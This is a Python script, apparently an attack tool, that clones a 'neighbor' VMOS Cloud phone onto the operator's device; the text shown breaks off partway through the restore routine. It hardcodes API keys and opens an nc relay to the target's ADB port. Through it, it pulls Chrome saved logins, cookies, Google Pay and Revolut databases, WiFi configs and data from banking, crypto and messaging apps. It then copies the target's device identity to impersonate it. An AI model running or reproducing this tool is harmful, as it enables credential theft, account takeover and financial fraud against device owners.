#!/usr/bin/env python3
"""
API-Native Neighbor Cloner v2.0
================================
Clones a VMOS Cloud neighbor device to our device using BOTH:
  1. VMOS Cloud API endpoints (asyncCmd, padProperties, uploadFileV3, STS)
  2. ADB-over-relay (nc tunnel) as fallback

From DEVICE_BACKUP_GUIDE.md analysis:
  Method 1 → padProperties       → export fingerprint (identity backup)
  Method 2 → screenshot          → visual snapshot
  Method 3 → asyncCmd            → tar/zip data on-device, get taskId, poll
  Method 4 → stsTokenByPadCode   → STS upload token for off-device retention
  
  BONUS: If neighbor padCode is known (from fleet enum), ALL methods work
  directly on neighbor — NO ADB relay needed at all!

New capabilities vs device_cloner.py:
  - Cloud API tar backup on source device (asyncCmd) — no relay data transfer
  - Pull backup file via adb after cloud-side archiving
  - Batch neighbor fingerprint read via batchPadProperties
  - Fleet enumeration to discover neighbor padCodes (same VMOS account)
  - STS token acquisition for external upload retention
  - uploadFileV3 to push backup directly into device via URL
  - getTaskStatus polling for async operations

Usage:
  python3 scanning/api_native_cloner.py list-neighbors
  python3 scanning/api_native_cloner.py fingerprint <PAD_CODE_OR_IP>
  python3 scanning/api_native_cloner.py extract <TARGET_IP_OR_PAD>
  python3 scanning/api_native_cloner.py restore <TARGET_IP_OR_PAD>
  python3 scanning/api_native_cloner.py full <TARGET_IP>
"""

import asyncio
import subprocess
import os
import sys
import json
import time
import sqlite3
import hashlib
import hmac
import base64
import httpx
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE_URL = "https://api.vmoscloud.com"
OUR_PAD  = "AC32010810392"
RELAY_PORT = 15573
ADB_BRIDGE = "localhost:8550"
CLONE_ROOT = "tmp/device_clones"
TASK_POLL_INTERVAL = 5    # seconds between polls
TASK_POLL_TIMEOUT  = 300  # max 5 min for async tasks

# Packages to always include
CRITICAL_PKGS = [
    "com.google.android.gms",
    "com.android.chrome",
    "com.android.vending",
]
HIGH_PRIORITY_KW = [
    "revolut", "paypal", "venmo", "cashapp", "wise", "transferwise",
    "maya", "gcash", "coinbase", "binance", "metamask", "trust",
    "wallet", "bank", "crypto", "pay", "money", "cash",
    "whatsapp", "telegram", "instagram", "facebook", "tiktok",
]
SYSTEM_SKIP = [
    "com.android.", "android.", "com.google.android.ext.",
    "com.google.android.networkstack", "com.google.android.cellbroadcast",
    "com.google.android.captiveportallogin", "com.google.android.documentsui",
    "com.google.android.feedback", "com.google.android.gsf",
    "com.google.android.inputmethod", "com.google.android.onetimeinitializer",
    "com.google.android.packageinstaller", "com.google.android.permissioncontroller",
    "com.google.android.webview", "com.cloud.", "com.owlproxy.", "com.vmos.",
]

# ═══════════════════════════════════════════════════════════════════════
# DIRECT HMAC-SHA256 SIGNING (for raw API calls)
# ═══════════════════════════════════════════════════════════════════════

def _sign(body_json: str) -> dict:
    """Build HMAC-SHA256 signed headers for direct API call."""
    ts = str(int(time.time()))
    raw = ts + AK + body_json
    sig = base64.b64encode(
        hmac.new(SK.encode(), raw.encode(), hashlib.sha256).digest()
    ).decode()
    return {
        "Content-Type": "application/json",
        "AccessId": AK,
        "Timestamp": ts,
        "Authorization": sig,
    }

async def _api_post(endpoint: str, body: dict) -> dict:
    """Raw signed POST to VMOS Cloud API."""
    body_json = json.dumps(body, separators=(",", ":"))
    headers = _sign(body_json)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(f"{BASE_URL}{endpoint}", content=body_json, headers=headers)
        return r.json()

# ═══════════════════════════════════════════════════════════════════════
# FLEET ENUMERATION — Find neighbor pad codes
# ═══════════════════════════════════════════════════════════════════════

async def list_all_devices(client) -> list[dict]:
    """Enumerate ALL devices in the account fleet (paginated)."""
    devices = []
    page = 1
    while True:
        resp = await client.cloud_phone_list(page=page, rows=50)
        data = resp.get("data", {})
        items = data.get("rows", []) if isinstance(data, dict) else []
        if not items:
            break
        devices.extend(items)
        if len(items) < 50:
            break
        page += 1
    return devices


async def find_neighbor_padcode(client, target_ip: str) -> str | None:
    """
    Try to find the padCode for a neighbor device by IP.
    Strategy: 
      1. Enumerate fleet
      2. Run `ifconfig | grep addr` on each to match IP
      3. Return padCode if found
    """
    print(f"  Enumerating fleet to find padCode for {target_ip}...")
    devices = await list_all_devices(client)
    print(f"  Fleet size: {len(devices)} devices")
    
    # Try to match by IP via sync_cmd on each (expensive but accurate)
    # Limit to devices with status=10 (running)
    running = [d for d in devices if d.get("status") == 10 or d.get("padStatus") == 10]
    print(f"  Running devices: {len(running)}")
    
    for dev in running[:20]:  # cap at 20 to avoid rate limiting
        pad = dev.get("padCode") or dev.get("code")
        if not pad or pad == OUR_PAD:
            continue
        try:
            r = await client.sync_cmd(pad, "ip route | head -3", timeout_sec=8)
            out = str(r.get("data", [{}])[0].get("errorMsg", ""))
            if target_ip in out:
                print(f"  ✓ Found padCode: {pad}")
                return pad
        except Exception:
            pass
        await asyncio.sleep(0.5)  # rate limit spacing
    
    return None

# ═══════════════════════════════════════════════════════════════════════
# METHOD 1: FINGERPRINT BACKUP via padProperties
# ═══════════════════════════════════════════════════════════════════════

async def backup_fingerprint(client, pad_code: str, out_path: str) -> dict:
    """
    Export device fingerprint via padProperties API.
    This is the cleanest API-native method — no ADB needed.
    Returns the properties dict and saves to file.
    """
    print(f"\n  [Fingerprint] Fetching {pad_code} properties...")
    resp = await client.query_instance_properties(pad_code)
    
    data = resp.get("data", {})
    if not data:
        print(f"  [Fingerprint] No data returned (code={resp.get('code')})")
        return {}
    
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    with open(out_path, "w") as f:
        json.dump(data, f, indent=2)
    
    prop_count = len(data) if isinstance(data, dict) else 0
    print(f"  [Fingerprint] Saved {prop_count} properties → {out_path}")
    return data


async def restore_fingerprint(client, fingerprint: dict, target_pad: str):
    """
    Push fingerprint properties to target pad via updatePadProperties.
    Safe: no restart required.
    """
    if not fingerprint:
        return
    
    # Filter to safe writable identity keys
    identity_keys = {
        "ro.product.brand", "ro.product.model", "ro.product.device",
        "ro.product.name", "ro.product.manufacturer",
        "ro.build.display.id", "ro.build.version.release",
        "ro.build.version.sdk", "ro.build.fingerprint",
        "ro.product.board", "ro.hardware", "ro.serialno",
    }
    
    writable = {k: v for k, v in fingerprint.items() if k in identity_keys and v}
    if not writable:
        return
    
    print(f"  [Fingerprint] Restoring {len(writable)} identity properties → {target_pad}")
    try:
        await client.modify_instance_properties([target_pad], writable)
        print(f"  [Fingerprint] Done")
    except Exception as e:
        print(f"  [Fingerprint] Error: {e}")

# ═══════════════════════════════════════════════════════════════════════
# METHOD 3: DATA BACKUP via asyncCmd + polling
# ═══════════════════════════════════════════════════════════════════════

async def poll_task(client, task_id, timeout=TASK_POLL_TIMEOUT) -> bool:
    """
    Poll task status until Completed or Failed.
    Uses padTaskDetail endpoint (correct for asyncCmd tasks).
    """
    deadline = time.time() + timeout
    attempt = 0
    while time.time() < deadline:
        attempt += 1
        try:
            resp = await client.task_detail([int(task_id)])
            items = resp.get("data", [])
            if isinstance(items, list) and items:
                status = items[0].get("taskStatus", "")
                if status in ("Completed", "Success", "3"):
                    return True
                if status in ("Failed", "Error", "4"):
                    print(f"    Task {task_id} FAILED: {items[0]}")
                    return False
        except Exception as e:
            if attempt % 6 == 0:
                print(f"    Poll error: {e}")
        await asyncio.sleep(TASK_POLL_INTERVAL)
    return False


async def async_cmd_and_wait(client, pad_code: str, cmd: str,
                              timeout=TASK_POLL_TIMEOUT) -> tuple[bool, str | None]:
    """
    Run asyncCmd on a device and poll until complete.
    Returns (success, task_id).
    """
    resp = await client.async_adb_cmd([pad_code], cmd)
    data = resp.get("data", {})
    task_id = None
    if isinstance(data, list) and data:
        task_id = data[0].get("taskId") or data[0].get("id")
    elif isinstance(data, dict):
        task_id = data.get("taskId") or data.get("id")
    
    if not task_id:
        # asyncCmd may complete synchronously (syncCmd fallback)
        return resp.get("code", -1) == 0, None
    
    print(f"    taskId={task_id}, polling...")
    ok = await poll_task(client, task_id, timeout)
    return ok, str(task_id)


async def cloud_backup_pkg_data(client, pad_code: str, pkg: str,
                                 local_dir: str) -> bool:
    """
    Use asyncCmd to tar package data ON the source device, then ADB pull.
    This avoids the slow relay tar transfer — the tar is created on-device
    via Cloud API (fast), then we pull via relay (data already compressed).
    """
    tar_remote = f"/data/local/tmp/cb_{pkg.replace('.','_')}.tgz"
    
    # Step 1: Create tar on device via Cloud API asyncCmd
    cmd = (f"cd /data/data/{pkg} 2>/dev/null && "
           f"tar czf {tar_remote} --exclude='./cache' --exclude='./code_cache' "
           f". 2>/dev/null && echo TAR_DONE || echo TAR_FAIL")
    
    ok, task_id = await async_cmd_and_wait(client, pad_code, cmd, timeout=120)
    return ok


async def cloud_backup_device(client, pad_code: str, pkg_list: list[str],
                               sdcard_tar: str = "/sdcard/cloud_backup.tgz") -> str | None:
    """
    Use asyncCmd to create a SINGLE archive of all critical data on device.
    More efficient than per-package tars.
    Returns remote path of archive if successful.
    """
    # Build paths list
    data_paths = " ".join(f"/data/data/{p}" for p in pkg_list[:10])  # cap to 10
    cmd = (f"tar czf {sdcard_tar} {data_paths} "
           f"--exclude='*/cache' --exclude='*/code_cache' "
           f"2>/dev/null && echo BACKUP_DONE || echo BACKUP_FAIL")
    
    print(f"  [CloudBackup] Creating unified archive on device {pad_code}...")
    ok, task_id = await async_cmd_and_wait(client, pad_code, cmd, timeout=300)
    if ok:
        print(f"  [CloudBackup] Archive created at {sdcard_tar}")
        return sdcard_tar
    else:
        print(f"  [CloudBackup] Archive creation failed")
        return None

# ═══════════════════════════════════════════════════════════════════════
# METHOD 4: STS TOKEN for external storage 
# ═══════════════════════════════════════════════════════════════════════

async def get_device_sts_token(client, pad_code: str) -> dict | None:
    """
    Get STS token for a device — enables external storage access.
    Token can be used for OSS/S3 operations if available.
    """
    try:
        resp = await client.get_sdk_token(pad_code)
        if resp.get("code") == 0:
            token_data = resp.get("data", {})
            print(f"  [STS] Token acquired for {pad_code}")
            return token_data
    except Exception as e:
        print(f"  [STS] Token error: {e}")
    return None

# ═══════════════════════════════════════════════════════════════════════
# ADB RELAY HELPERS (from device_cloner.py — proven pattern)
# ═══════════════════════════════════════════════════════════════════════

def adb(addr: str, cmd: str, timeout=15) -> str:
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "shell", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()
    except Exception:
        return ""

def adb_pull(addr: str, remote: str, local: str, timeout=120) -> bool:
    os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "pull", remote, local],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False

def adb_push(addr: str, local: str, remote: str, timeout=120) -> bool:
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "push", local, remote],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False

async def deploy_relay(client, target_ip: str, port=RELAY_PORT) -> bool:
    """Deploy nc relay on our device pointing to target."""
    await client.sync_cmd(OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /data/local/tmp/rf_{port}; echo c",
        timeout_sec=8)
    await asyncio.sleep(0.4)
    r = await client.sync_cmd(OUR_PAD,
        f"mkfifo /data/local/tmp/rf_{port} && echo fifo_ok", timeout_sec=8)
    d = r.get("data", [])
    if not d or "fifo_ok" not in str(d[0].get("errorMsg", "")):
        return False
    await asyncio.sleep(0.3)
    r = await client.sync_cmd(OUR_PAD,
        f'nohup sh -c "nc -l -p {port} < /data/local/tmp/rf_{port} | '
        f'nc {target_ip} 5555 > /data/local/tmp/rf_{port}" > /dev/null 2>&1 & echo relay_ok',
        timeout_sec=8)
    d = r.get("data", [])
    return bool(d) and "relay_ok" in str(d[0].get("errorMsg", ""))

def connect_relay(port=RELAY_PORT) -> str:
    addr = f"localhost:{port}"
    subprocess.run(["adb", "disconnect", addr], capture_output=True, timeout=5)
    subprocess.run(["adb", "-s", ADB_BRIDGE, "forward", f"tcp:{port}", f"tcp:{port}"],
                   capture_output=True, timeout=8)
    subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
    return addr

async def kill_relay(client, port=RELAY_PORT):
    await client.sync_cmd(OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; echo d", timeout_sec=5)

# ═══════════════════════════════════════════════════════════════════════
# PACKAGE HELPERS
# ═══════════════════════════════════════════════════════════════════════

def should_skip(pkg: str) -> bool:
    return any(pkg.startswith(p) for p in SYSTEM_SKIP)

def is_high_priority(pkg: str) -> bool:
    return any(kw in pkg.lower() for kw in HIGH_PRIORITY_KW)

def classify_pkgs(pkgs: list[str]) -> tuple[list, list, list]:
    crit, high, norm = [], [], []
    for p in pkgs:
        if should_skip(p):
            continue
        if p in CRITICAL_PKGS:
            crit.append(p)
        elif is_high_priority(p):
            high.append(p)
        else:
            norm.append(p)
    return crit, high, norm

# ═══════════════════════════════════════════════════════════════════════
# ENHANCED EXTRACTION — API-native + ADB relay fallback
# ═══════════════════════════════════════════════════════════════════════

async def extract_device_enhanced(client, target_ip: str) -> dict | None:
    """
    Enhanced extraction using:
      - Cloud API padProperties for fingerprint (no ADB needed)
      - Cloud API asyncCmd to pre-create tar archives on target (faster)
      - ADB relay to pull archives
      - ADB relay for per-package data if asyncCmd not available
    """
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    os.makedirs(clone_dir, exist_ok=True)

    print(f"\n{'═'*70}")
    print(f"  API-NATIVE CLONER v2.0 — EXTRACTION")
    print(f"  Target: {target_ip}")
    print(f"  Clone dir: {clone_dir}")
    print(f"{'═'*70}")

    # ── Step 0: Try to find neighbor padCode via fleet enum ──────────
    print(f"\n  [Step 0] Fleet enumeration for neighbor padCode...")
    neighbor_pad = await find_neighbor_padcode(client, target_ip)
    if neighbor_pad:
        print(f"  ✓ Neighbor padCode: {neighbor_pad}")
        # Export fingerprint via API (no ADB relay needed!)
        fp_path = os.path.join(clone_dir, "fingerprint.json")
        fingerprint = await backup_fingerprint(client, neighbor_pad, fp_path)
    else:
        print(f"  ✗ padCode not found — will use ADB relay for fingerprint")
        fingerprint = {}

    # ── Step 1: Deploy ADB relay ──────────────────────────────────────
    print(f"\n  [Step 1] Deploying ADB relay → {target_ip}...")
    if not await deploy_relay(client, target_ip):
        print("  [!] Relay deploy FAILED")
        return None
    await asyncio.sleep(0.6)
    
    addr = connect_relay()
    await asyncio.sleep(0.8)
    
    test = adb(addr, "echo OK", 5)
    if "OK" not in test:
        print("  [!] ADB not responding through relay")
        return None

    model  = adb(addr, "getprop ro.product.model")
    brand  = adb(addr, "getprop ro.product.brand")
    av     = adb(addr, "getprop ro.build.version.release")
    is_root = "uid=0" in adb(addr, "id")

    print(f"  Device: {brand} {model}  Android {av}  root={'YES' if is_root else 'NO'}")

    report = {
        "target_ip": target_ip,
        "neighbor_pad": neighbor_pad,
        "brand": brand, "model": model, "android": av,
        "is_root": is_root,
        "extracted_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "packages": {},
        "fingerprint": fingerprint,
    }

    # ── Step 2: Package enumeration ───────────────────────────────────
    raw = adb(addr, "pm list packages -3 2>/dev/null | cut -d: -f2", 15)
    all_3p = [p.strip() for p in raw.splitlines() if p.strip()]
    crit, high, norm = classify_pkgs(all_3p)
    for p in CRITICAL_PKGS:
        if p not in crit:
            crit.insert(0, p)

    extract_order = crit + high + norm
    print(f"\n  Packages: {len(crit)} critical + {len(high)} high + {len(norm)} normal = {len(extract_order)}")
    print(f"  Critical: {', '.join(crit)}")
    if high:
        print(f"  High: {', '.join(high[:8])}{'...' if len(high) > 8 else ''}")

    # ── Step 3: API-native tar (if neighbor pad known) ────────────────
    if neighbor_pad:
        print(f"\n  [Step 3] Cloud API tar backup (asyncCmd on neighbor {neighbor_pad})...")
        target_pkgs = crit + high[:5]  # top priority only for cloud tar
        sdcard_backup = "/sdcard/titan_backup.tgz"
        
        backup_path = await cloud_backup_device(client, neighbor_pad,
                                                  target_pkgs, sdcard_backup)
        if backup_path:
            local_unified = os.path.join(clone_dir, "unified_backup.tgz")
            print(f"  Pulling unified backup via relay...")
            if adb_pull(addr, backup_path, local_unified, 300):
                sz = os.path.getsize(local_unified) / 1024 / 1024
                print(f"  ✓ Unified backup: {sz:.1f} MB → {local_unified}")
                report["unified_backup"] = local_unified
                adb(addr, f"rm -f {backup_path}", 5)  # cleanup remote
            else:
                print(f"  ✗ Unified backup pull failed — continuing with per-pkg method")
    
    # ── Step 4: Per-package extraction (ADB relay) ────────────────────
    print(f"\n  [Step 4] Per-package extraction via ADB relay...")
    total = len(extract_order)
    
    for idx, pkg in enumerate(extract_order, 1):
        print(f"\n  [{idx:3d}/{total}] {pkg}", end="", flush=True)
        
        pkg_dir = os.path.join(clone_dir, "apps", pkg)
        os.makedirs(pkg_dir, exist_ok=True)
        pkg_rpt = {"status": "pending"}
        
        data_path = f"/data/data/{pkg}"
        ls_test = adb(addr, f"ls {data_path}/ 2>/dev/null | head -1", 5)
        if not ls_test:
            print(f" → no data", end="")
            pkg_rpt["status"] = "no_data"
            report["packages"][pkg] = pkg_rpt
            continue

        # APK (skip if already exists from unified backup)
        apk_line = adb(addr, f"pm path {pkg} 2>/dev/null | head -1", 5)
        if apk_line and "package:" in apk_line:
            apk_remote = apk_line.replace("package:", "").strip()
            apk_local = os.path.join(pkg_dir, "base.apk")
            if not os.path.exists(apk_local):
                ok = adb_pull(addr, apk_remote, apk_local, 120)
                if ok:
                    sz = os.path.getsize(apk_local) / 1024 / 1024
                    print(f" APK {sz:.1f}M", end="", flush=True)
                    pkg_rpt["apk"] = True
                else:
                    print(f" APK-fail", end="", flush=True)
                    pkg_rpt["apk"] = False
            else:
                print(f" APK-cached", end="", flush=True)
                pkg_rpt["apk"] = True

        # Data tar
        tar_remote = f"/data/local/tmp/cb_{pkg.replace('.','_')}.tgz"
        tar_local  = os.path.join(pkg_dir, "data.tar.gz")
        
        tar_cmd = (f"cd {data_path} && tar czf {tar_remote} "
                   f"--exclude=cache --exclude=code_cache "
                   f". 2>/dev/null && echo TAR_OK")
        tar_result = adb(addr, tar_cmd, 90)
        
        if "TAR_OK" in tar_result and adb_pull(addr, tar_remote, tar_local, 180):
            sz = os.path.getsize(tar_local) / 1024
            print(f" data {sz:.0f}K ✓", end="", flush=True)
            pkg_rpt.update({"data_tar": True, "data_size_kb": round(sz, 1)})
            adb(addr, f"rm -f {tar_remote}", 5)
        else:
            # Fallback: individual files
            pulled = 0
            for sub in ["databases", "shared_prefs", "files"]:
                flist = adb(addr, f"ls {data_path}/{sub}/ 2>/dev/null", 5)
                if not flist:
                    continue
                sub_local = os.path.join(pkg_dir, sub)
                os.makedirs(sub_local, exist_ok=True)
                for fn in flist.splitlines():
                    fn = fn.strip()
                    if fn and not fn.endswith(("-wal", "-shm", "-journal")):
                        if adb_pull(addr, f"{data_path}/{sub}/{fn}",
                                    os.path.join(sub_local, fn), 30):
                            pulled += 1
            print(f" files={pulled}", end="", flush=True)
            pkg_rpt["individual_files"] = pulled
        
        pkg_rpt["status"] = "extracted"
        report["packages"][pkg] = pkg_rpt

    # ── Step 5: Device-level extras ───────────────────────────────────
    print(f"\n\n  [Step 5] Device-level data...")

    # Accounts dump
    accts_raw = adb(addr, "dumpsys account 2>/dev/null", 20)
    with open(os.path.join(clone_dir, "accounts_dump.txt"), "w") as f:
        f.write(accts_raw)
    accounts = []
    for line in accts_raw.splitlines():
        if "Account {" in line and "name=" in line:
            try:
                name = line.split("name=")[1].split(",")[0]
                atype = line.split("type=")[1].rstrip("}").strip()
                accounts.append({"name": name, "type": atype})
            except (IndexError, ValueError):
                pass
    report["accounts"] = accounts
    print(f"  Accounts: {len(accounts)}")

    # Build props (if not already from padProperties API)
    if not fingerprint:
        props_raw = adb(addr, "getprop", 20)
        with open(os.path.join(clone_dir, "build.prop"), "w") as f:
            f.write(props_raw)
        print(f"  Properties: {len(props_raw.splitlines())} lines")

    # WiFi networks
    wifi = adb(addr, "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 10)
    if wifi:
        with open(os.path.join(clone_dir, "WifiConfigStore.xml"), "w") as f:
            f.write(wifi)
        print(f"  WiFi config: ✓")

    # ── Step 6: Chrome special extraction ─────────────────────────────
    print(f"\n  [Step 6] Chrome data...")
    chrome_dir = os.path.join(clone_dir, "chrome_data")
    os.makedirs(chrome_dir, exist_ok=True)
    for db_name in ["Login Data", "Web Data", "Cookies", "History"]:
        remote = f'/data/data/com.android.chrome/app_chrome/Default/{db_name}'
        local  = os.path.join(chrome_dir, db_name.replace(" ", "_") + ".db")
        if adb_pull(addr, remote, local, 30):
            print(f"    {db_name}: ✓", end="")
            if "Login" in db_name:
                try:
                    conn = sqlite3.connect(local)
                    rows = conn.execute(
                        "SELECT origin_url, username_value FROM logins LIMIT 20"
                    ).fetchall()
                    report["chrome_logins"] = [{"url": r[0], "user": r[1]} for r in rows]
                    print(f" ({len(rows)} saved logins)")
                    conn.close()
                except Exception:
                    print()
            else:
                print()

    # TapAndPay
    tap_local = os.path.join(clone_dir, "tapandpay.db")
    if adb_pull(addr, "/data/data/com.google.android.gms/databases/tapandpay.db",
                tap_local, 30):
        print(f"    tapandpay.db: ✓")

    # COIN.xml
    coin = adb(addr, "cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null", 10)
    if coin:
        with open(os.path.join(clone_dir, "COIN.xml"), "w") as f:
            f.write(coin)
        print(f"    COIN.xml: ✓")
    
    # Revolut special DBs (direct pull for freshness)
    print(f"\n  [Step 6b] Revolut direct DB extraction...")
    revolut_dir = os.path.join(clone_dir, "revolut_dbs")
    os.makedirs(revolut_dir, exist_ok=True)
    revolut_dbs = [
        "sso_db", "accounts_db", "transactions_db", "trading_database",
        "aqueduct.sqlite", "crypto_investments_database", "loan_db",
        "shared_wealth_domain_database", "rates_database",
    ]
    rev_base = "/data/data/com.revolut.revolut/databases"
    rev_prefs_base = "/data/data/com.revolut.revolut/shared_prefs"
    
    for db in revolut_dbs:
        local = os.path.join(revolut_dir, db)
        if adb_pull(addr, f"{rev_base}/{db}", local, 30):
            sz = os.path.getsize(local) / 1024
            print(f"    {db}: {sz:.0f}K ✓")
    
    # Key prefs
    key_prefs = ["revolut_login_prefs.xml", "security_manager.xml",
                 "com.revolut.revolut_preferences.xml", "PREF_UNIQUE_ID.xml"]
    for pref in key_prefs:
        local = os.path.join(revolut_dir, pref)
        if adb_pull(addr, f"{rev_prefs_base}/{pref}", local, 15):
            print(f"    {pref}: ✓")

    # ── Step 7: STS token (optional, for external retention) ──────────
    if neighbor_pad:
        print(f"\n  [Step 7] Acquiring STS token for {neighbor_pad}...")
        sts = await get_device_sts_token(client, neighbor_pad)
        if sts:
            with open(os.path.join(clone_dir, "sts_token.json"), "w") as f:
                json.dump(sts, f, indent=2)
            report["sts_token"] = sts
            print(f"  [STS] Token saved (expires in 1h)")

    # ── Save report ───────────────────────────────────────────────────
    report["status"] = "extracted"
    with open(os.path.join(clone_dir, "clone_report.json"), "w") as f:
        json.dump(report, f, indent=2, default=str)

    extracted = sum(1 for p in report["packages"].values() if p.get("status") == "extracted")
    total_data_mb = sum(p.get("data_size_kb", 0) for p in report["packages"].values()) / 1024

    print(f"\n{'═'*70}")
    print(f"  EXTRACTION COMPLETE")
    print(f"  Source pad: {neighbor_pad or 'unknown'}")
    print(f"  Packages:   {extracted}/{total}")
    print(f"  Data:       {total_data_mb:.1f} MB")
    print(f"  Accounts:   {len(accounts)}")
    print(f"  Clone dir:  {clone_dir}")
    print(f"{'═'*70}")

    subprocess.run(["adb", "disconnect", f"localhost:{RELAY_PORT}"],
                   capture_output=True, timeout=5)
    await kill_relay(client)

    return report

# ═══════════════════════════════════════════════════════════════════════
# ENHANCED RESTORE — API-native + ADB push
# ═══════════════════════════════════════════════════════════════════════

async def restore_device_enhanced(client, target_ip: str):
    """
    Enhanced restore with:
      - API fingerprint push via updatePadProperties
      - installApp via Cloud API (if APK URL accessible)
      - ADB push + untar for data
      - Permission fixing
    """
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    report_file = os.path.join(clone_dir, "clone_report.json")

    if not os.path.exists(report_file):
        print(f"[!] No clone report. Run extraction first.")
        return

    with open(report_file) as f:
        report = json.load(f)

    print(f"\n{'═'*70}")
    print(f"  API-NATIVE CLONER v2.0 — RESTORE")
    print(f"  Source: {target_ip} ({report.get('brand','')} {report.get('model','')})")
    print(f"  Target: {OUR_PAD}")
    print(f"{'═'*70}")

    our_dev = ADB_BRIDGE
    is_root = "uid=0" in adb(our_dev, "id", 5)
    print(f"  Our shell: root={is_root}")

    if not is_root:
        print("  Enabling root via Cloud API...")
        await client.switch_root([OUR_PAD], enable=True, root_type=0)
        await asyncio.sleep(3)
        is_root = "uid=0" in adb(our_dev, "id", 5)

    restore_log = {
        "source": target_ip,
        "target": OUR_PAD,
        "started": time.strftime("%Y-%m-%d %H:%M:%S"),
        "apps": {},
    }

    # ── Restore fingerprint via API ────────────────────────────────────
    fp = report.get("fingerprint", {})
    if fp:
        await restore_fingerprint(client, fp, OUR_PAD)
    else:
        # Fallback: parse build.prop
        props_file = os.path.join(clone_dir, "build.prop")
        if os.path.exists(props_file):
            identity_keys = {
                "ro.product.brand", "ro.product.model", "ro.product.device",
                "ro.product.name", "ro.product.manufacturer",
                "ro.build.fingerprint", "ro.serialno",
            }
            fp = {}
            with open(props_file) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("[") and "]: [" in line:
                        k = line.split("]: [")[0].lstrip("[")
                        v = line.split("]: [")[1].rstrip("]")
                        if k in identity_keys and v:
                            fp[k] = v
            if fp:
                await restore_fingerprint(client, fp, OUR_PAD)

    # ── Per-package restore ────────────────────────────────────────────
    apps_dir = os.path.join(clone_dir, "apps")
    pkgs = list(report.get("packages", {}).keys())
    total = len(pkgs)

    for idx, pkg in enumerate(pkgs, 1):
        info = report["packages"].get(pkg, {})
        if info.get("status") != "extracted":
            continue

        pkg_dir = os.path.join(apps_dir, pkg)
        if not os.path.exists(pkg_dir):
            continue

        print(f"\n  [{idx:3d}/{total}] {pkg}")
        app_log = {"status": "pending"}

        # Install APK
        apk_path = os.path.join(pkg_dir, "base.apk")
        existing = adb(our_dev, f"pm path {pkg} 2>/dev/null", 5)
        if existing:
            print(f"    Already installed")
        elif os.path.exists(apk_path):
            sz = os.path.getsize(apk_path) / 1024 / 1024
            print(f"    Installing APK ({sz:.1f} MB)...", end="", flush=True)
            remote_apk = f"/data/local/tmp/cn_{pkg.replace('.','_')}.apk"
            if adb_push(our_dev, apk_path, remote_apk, 200):
                res = adb(our_dev, f"pm install -r -g -d {remote_apk} 2>&1", 60)
                ok = "Success" in res
                print(f" {'OK' if ok else 'FAIL'} {res[:80]}")
                app_log["install"] = ok
                adb(our_dev, f"rm -f {remote_apk}", 5)
            else:
                print(f" push failed")
                app_log["status"] = "push_failed"
                restore_log["apps"][pkg] = app_log
                continue
        else:
            if not existing:
                print(f"    No APK, not installed — skip")
                app_log["status"] = "skipped"
                restore_log["apps"][pkg] = app_log
                continue

        # Force stop before data restore
        adb(our_dev, f"am force-stop {pkg}", 5)
        await asyncio.sleep(0.3)

        # Restore data
        data_path = f"/data/data/{pkg}"
        data_tar = os.path.join(pkg_dir, "data.tar.gz")

        if os.path.exists(data_tar):
            remote_tar = f"/data/local/tmp/cn_data_{pkg.replace('.','_')}.tgz"
            print(f"    Restoring tar ({os.path.getsize(data_tar)//1024}K)...", end="", flush=True)
            if adb_push(our_dev, data_tar, remote_tar, 200):
                adb(our_dev, f"mkdir -p {data_path}", 5)
                res = adb(our_dev, f"cd {data_path} && tar xzf {remote_tar} 2>&1 && echo EX_OK", 120)
                ok = "EX_OK" in res
                print(f" {'OK' if ok else 'FAIL'}")
                app_log["data_restore"] = ok
                adb(our_dev, f"rm -f {remote_tar}", 5)
            else:
                print(f" push failed")
                app_log["data_restore"] = False
        else:
            # Individual files fallback
            pushed = 0
            for sub in ["databases", "shared_prefs", "files"]:
                sub_local = os.path.join(pkg_dir, sub)
                if not os.path.exists(sub_local):
                    continue
                rem_sub = f"{data_path}/{sub}"
                adb(our_dev, f"mkdir -p {rem_sub}", 5)
                for fn in os.listdir(sub_local):
                    fp_f = os.path.join(sub_local, fn)
                    if os.path.isfile(fp_f):
                        if adb_push(our_dev, fp_f, f"{rem_sub}/{fn}", 30):
                            pushed += 1
            print(f"    Individual files: {pushed}")
            app_log["data_restore"] = pushed > 0

        # Fix permissions
        if is_root:
            uid = adb(our_dev, f"stat -c '%u' {data_path} 2>/dev/null", 5)
            if not uid or not uid.isdigit():
                uid_raw = adb(our_dev,
                    f"dumpsys package {pkg} 2>/dev/null | grep userId= | head -1", 8)
                if "userId=" in uid_raw:
                    try:
                        uid = uid_raw.split("userId=")[1].split()[0].strip()
                    except (IndexError, ValueError):
                        uid = ""
            if uid and uid.isdigit():
                adb(our_dev, f"chown -R {uid}:{uid} {data_path}/", 10)
                adb(our_dev, f"chmod -R 770 {data_path}/", 5)
                adb(our_dev, f"restorecon -R {data_path}/ 2>/dev/null", 5)
                print(f"    Permissions fixed (uid={uid})")

        app_log["status"] = "restored"
        restore_log["apps"][pkg] = app_log

    # ── Chrome ─────────────────────────────────────────────────────────
    chrome_dir = os.path.join(clone_dir, "chrome_data")
    if os.path.exists(chrome_dir):
        print(f"\n  ── Chrome data ──")
